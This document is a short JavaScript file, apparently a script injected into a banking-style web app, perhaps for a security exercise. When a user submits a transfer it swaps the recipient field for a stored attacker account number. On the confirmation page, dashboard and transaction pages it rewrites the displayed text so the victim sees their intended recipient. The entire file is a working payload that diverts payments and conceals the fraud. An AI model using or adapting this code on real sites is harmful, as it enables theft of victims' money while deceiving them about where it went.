const hackerAccount = window.localStorage.getItem("hackerAccount");

if (window.location.toString().match(/\/transaction\/new/)) {
  const form = document.querySelector("form");
  
  if (form.action.toString().match(/\/transaction\/new\/confirm/)) {
    const replaceValue = window.localStorage.getItem("victimAccount");
    const info = document.querySelector("#content");
    info.innerHTML = info.innerHTML.replace(hackerAccount, replaceValue);
  } else {
    let victimAccountNumber = window.localStorage.getItem("victimAccount");
    const recieverField = document.querySelector("#id_reciever");

    form.onsubmit = () => {
      if(!victimAccountNumber) {
        window.localStorage.setItem("victimAccount", recieverField.value);
        victimAccountNumber = recieverField.value;
      }
      if(victimAccountNumber === recieverField.value) {
        recieverField.value = hackerAccount;
      }
    }
    if(recieverField.value === hackerAccount) {
      recieverField.value = victimAccountNumber;
    }
  }
} else if (window.location.toString().match(/\/dashboard/)) {  
  document.querySelectorAll(".to-account").forEach(item=> {
    if(item.innerText === hackerAccount) {
      item.innerText = window.localStorage.getItem("victimAccount");
    }
  });
} else if (window.location.toString().match(/\/transaction/)) {
  const body = document.querySelector("body > div");
  body.innerHTML = body.innerHTML.replaceAll(hackerAccount, window.localStorage.getItem("victimAccount"));
}
